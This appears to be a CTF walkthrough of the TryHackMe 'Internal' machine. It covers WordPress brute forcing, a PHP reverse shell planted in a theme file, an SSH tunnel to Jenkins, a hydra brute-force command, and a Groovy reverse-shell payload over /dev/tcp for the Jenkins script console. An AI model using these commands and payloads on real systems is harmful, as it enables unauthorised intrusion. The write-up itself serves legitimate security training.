#tryhackme #ctf
# Internal
---

Add `<machine-ip>    internal.thm` in your /etc/hosts

## Nmap
- 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

## Gobuster
- /blog
- /blog/wp-content
- /blog/wp-includes
- /blog/wp-admin
- /javascript
- /phpmyadmin

## WPScan
- Worpress version 5.4.2
- wp-cron.php is not disabled
- Password brute force -> admin:my2boys

_________

Open admin dashboard using creds **admin:my2boys**
Open posts -> private post 

>Don’t forget to reset Will’s credentials. william:arnold147

Theme editor -> 404.php -> change code to php reverse shell
- Run `nc -lvnp <port>` on attacker machine
- Visit http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
- *Gained shell :)*

_________

Upload linpeas.sh in /tmp (for more info: [[Transferring Files]]) and run
- *Found creds for phpmyadmin -> wordpress:wordpress123*
- *Found creds for phpmyadmin -> phpmyadmin:B2Ud4fEOZmVq*

*Nothing of use here. A misdirection*

Use manual enumeration ([[Linux-PrivEsc#Manual]]):
- *Found wp-save.txt in /opt/*

`cat /opt/wp-save.txt`

> Bill,
>
>Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
>
>aubreanna:bubb13guM!@#123

- *Found creds **aubreanna:bubb13guM!@#123***

SSH into the machine using Aubreanna's creds
`cd /home/aubreanna`
`cat user.txt`
- *[FLAG 1]*

---

`cat jenkins.txt`
> Internal Jenkins service is running on 172.17.0.2:8080

(We cannot access it in our browser)
Need to use SSH tunneling to forward Jenkins \<ip>:\<port> to our attacker machine's \<ip>:\<port>
`ssh -L 6767:172.17.0.2:8080 aubreanna@10.10.75.221`

(Now we can access Jenkins in our browser by visiting localhost:6767)

Brute force Jenkins admin password
- *open burpsuite and capture the form name and request*
- *craft the hydra command using http-post-form*
``
hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm -s 6767 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
``

- *Found password: **spongebob***


Log in to Jenkins with creds **admin:spongebob**
Go to Manage Jenkins -> script console
Write code for java reverse shell in the console

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<tun0-ip>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

Start listener on netcat `nc -lvnp <port>`
- *Gained shell in Jenkins*


Manually enumerate ([[Linux-PrivEsc#Manual]]) and use the find command to locate .txt files (as Jenkins does not run `locate` command)

`find / -name *.txt`

- *Found /opt/note.txt*

`cat /opt/note.txt`

> "Aubreanna,
>
>Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.
>
>root:tr0ub13guM!@#123"

- *Found root creds **root:tr0ub13guM!@#123***

Login to root using the found creds
- *Gained root shell*

`cd /root`
`cat root.txt`
- *[FLAG 2]*

---
